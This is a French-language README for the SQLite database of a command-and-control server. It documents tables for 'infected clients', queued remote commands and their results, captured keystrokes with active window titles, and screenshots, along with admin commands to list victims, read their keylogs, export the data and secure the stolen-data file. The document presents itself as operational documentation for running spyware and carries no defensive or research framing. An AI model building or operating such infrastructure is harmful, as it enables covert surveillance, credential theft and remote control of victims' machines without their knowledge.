# Base de Données C2 Server

## Vue d'ensemble

Le serveur C2 utilise maintenant une base de données SQLite pour persister toutes les informations collectées. Cela remplace le stockage en mémoire précédent et offre plusieurs avantages :

- ✅ Persistance des données entre les redémarrages
- ✅ Capacité de stockage illimitée
- ✅ Requêtes SQL efficaces
- ✅ Historique complet des activités
- ✅ Export et analyse des données

## Structure de la Base de Données

### Tables Principales

#### 1. **clients**
Stocke les informations sur chaque client infecté.

| Colonne | Type | Description |
|---------|------|-------------|
| client_id | TEXT | Identifiant unique du client (PRIMARY KEY) |
| system_info | TEXT | Informations système en JSON |
| first_seen | REAL | Timestamp de première connexion |
| last_seen | REAL | Timestamp de dernière activité |
| ip_address | TEXT | Adresse IP du client |
| checkin_count | INTEGER | Nombre de check-ins |
| created_at | TIMESTAMP | Date de création |
| updated_at | TIMESTAMP | Date de dernière mise à jour |

#### 2. **pending_commands**
Commandes en attente d'exécution par les clients.

| Colonne | Type | Description |
|---------|------|-------------|
| id | INTEGER | ID auto-incrémenté |
| command_id | TEXT | ID unique de la commande |
| client_id | TEXT | Client destinataire |
| action | TEXT | Type d'action |
| data | TEXT | Données de la commande (JSON) |
| timestamp | REAL | Timestamp de création |
| status | TEXT | 'pending' ou 'sent' |

#### 3. **command_results**
Résultats des commandes exécutées.

| Colonne | Type | Description |
|---------|------|-------------|
| id | INTEGER | ID auto-incrémenté |
| command_id | TEXT | ID de la commande |
| client_id | TEXT | Client ayant exécuté |
| result | TEXT | Résultat (JSON) |
| timestamp | REAL | Timestamp de réception |

#### 4. **keylogs**
Captures de frappes clavier.

| Colonne | Type | Description |
|---------|------|-------------|
| id | INTEGER | ID auto-incrémenté |
| client_id | TEXT | Client source |
| timestamp | TEXT | Timestamp du keylog |
| window_title | TEXT | Titre de la fenêtre active |
| key_data | TEXT | Touche capturée |
| event_type | TEXT | Type d'événement |

#### 5. **screenshots**
Captures d'écran.

| Colonne | Type | Description |
|---------|------|-------------|
| id | INTEGER | ID auto-incrémenté |
| client_id | TEXT | Client source |
| screenshot_data | TEXT | Données de l'image (base64) |
| metadata | TEXT | Métadonnées (JSON) |
| timestamp | REAL | Timestamp de capture |

#### 6. **activity_log**
Historique des activités.

| Colonne | Type | Description |
|---------|------|-------------|
| id | INTEGER | ID auto-incrémenté |
| client_id | TEXT | Client concerné |
| activity_type | TEXT | Type d'activité |
| description | TEXT | Description |
| timestamp | REAL | Timestamp |

## Utilisation

### 1. Démarrage du Serveur

Le serveur initialise automatiquement la base de données au démarrage :

```bash
python server.py
```

La base de données `c2_server.db` sera créée automatiquement dans le répertoire courant.

### 2. Gestion de la Base de Données

Utilisez le script `db_manager.py` pour gérer et visualiser les données :

#### Lister tous les clients
```bash
python db_manager.py --clients
```

#### Voir les détails d'un client
```bash
python db_manager.py --client-details <CLIENT_ID>
```

#### Afficher les statistiques de keylogs
```bash
python db_manager.py --keylogs
```

#### Voir les keylogs d'un client spécifique
```bash
python db_manager.py --keylogs --client <CLIENT_ID> --limit 100
```

#### Afficher l'historique des activités
```bash
python db_manager.py --activities --limit 50
```

#### Activités d'un client
```bash
python db_manager.py --activities --client <CLIENT_ID>
```

#### Statistiques globales
```bash
python db_manager.py --stats
```

#### Nettoyer la base de données
```bash
python db_manager.py --cleanup
```

#### Exporter toutes les données
```bash
python db_manager.py --export backup.json
```

### 3. Accès Direct via Python

```python
from database import Database

# Initialiser
db = Database("c2_server.db")

# Récupérer tous les clients
clients = db.get_all_clients()

# Récupérer un client spécifique
client = db.get_client("client_id_here")

# Récupérer les keylogs
keylogs = db.get_keylogs("client_id_here", limit=100)

# Récupérer les statistiques
stats = db.get_keylog_stats()

# Ajouter une activité
db.log_activity("client_id", "test", "Activité de test")
```

## Maintenance

### Nettoyage Automatique

Le serveur effectue automatiquement :

- **Clients inactifs** : Suppression après 1 heure d'inactivité (configurable)
- **Résultats de commandes** : Suppression après 1 heure
- **Keylogs** : Suppression après 24 heures (configurable)

### Nettoyage Manuel

```bash
python db_manager.py --cleanup
```

### Sauvegarde

#### Méthode 1 : Copie du fichier
```bash
# Windows
copy c2_server.db c2_server_backup.db

# Linux
cp c2_server.db c2_server_backup.db
```

#### Méthode 2 : Export JSON
```bash
python db_manager.py --export backup_$(date +%Y%m%d).json
```

### Restauration

```bash
# Windows
copy c2_server_backup.db c2_server.db

# Linux
cp c2_server_backup.db c2_server.db
```

## Performance

### Index

La base de données utilise plusieurs index pour optimiser les performances :

- `idx_clients_last_seen` : Sur `clients(last_seen)`
- `idx_pending_commands_client` : Sur `pending_commands(client_id, status)`
- `idx_keylogs_client` : Sur `keylogs(client_id, created_at)`
- `idx_command_results_command_id` : Sur `command_results(command_id)`
- `idx_activity_log_client` : Sur `activity_log(client_id, timestamp)`

### Optimisation

Pour de grandes quantités de données, considérez :

1. **Augmenter la taille du cache SQLite** :
```python
db.get_connection().execute("PRAGMA cache_size = -64000")  # 64 MB
```

2. **Activer le mode WAL** pour de meilleures performances concurrentes :
```python
db.get_connection().execute("PRAGMA journal_mode = WAL")
```

3. **Nettoyer régulièrement** les anciennes données

## Migration depuis le Stockage en Mémoire

Si vous aviez des données en mémoire avant la migration, elles ne seront pas automatiquement transférées. La base de données commencera vide et se remplira au fur et à mesure des nouvelles connexions.

## Sécurité

⚠️ **IMPORTANT** : La base de données contient des informations sensibles !

### Recommandations :

1. **Chiffrement** : Envisagez de chiffrer le fichier de BD
   ```bash
   # Exemple avec SQLCipher (nécessite installation)
   ```

2. **Permissions** : Restreindre l'accès au fichier
   ```bash
   # Linux
   chmod 600 c2_server.db
   
   # Windows
   icacls c2_server.db /inheritance:r /grant:r "%USERNAME%:F"
   ```

3. **Sauvegarde sécurisée** : Chiffrer les exports
   ```bash
   # Exemple avec GPG
   python db_manager.py --export backup.json
   gpg -c backup.json
   rm backup.json
   ```

## Dépannage

### Base de données verrouillée

Si vous obtenez une erreur "database is locked" :

```python
# Augmenter le timeout
conn = sqlite3.connect('c2_server.db', timeout=30.0)
```

### Corruption de la BD

```bash
# Vérifier l'intégrité
sqlite3 c2_server.db "PRAGMA integrity_check;"

# Réparer
sqlite3 c2_server.db ".recover" | sqlite3 recovered.db
```

### Performances lentes

```bash
# Analyser la BD
sqlite3 c2_server.db "ANALYZE;"

# Vider et reconstruire
sqlite3 c2_server.db "VACUUM;"
```

## Schéma SQL Complet

Pour créer manuellement la base de données ou la modifier :

```sql
-- Voir database.py, méthode init_database()
```

## API de la Classe Database

Consultez [database.py](database.py) pour la documentation complète de l'API.

Principales méthodes :
- `register_client()` - Enregistrer un client
- `update_client_heartbeat()` - Mettre à jour le heartbeat
- `get_all_clients()` - Récupérer tous les clients
- `add_pending_command()` - Ajouter une commande
- `get_pending_commands()` - Récupérer les commandes en attente
- `add_command_result()` - Stocker un résultat
- `add_keylogs()` - Ajouter des keylogs
- `get_keylogs()` - Récupérer des keylogs
- `log_activity()` - Logger une activité
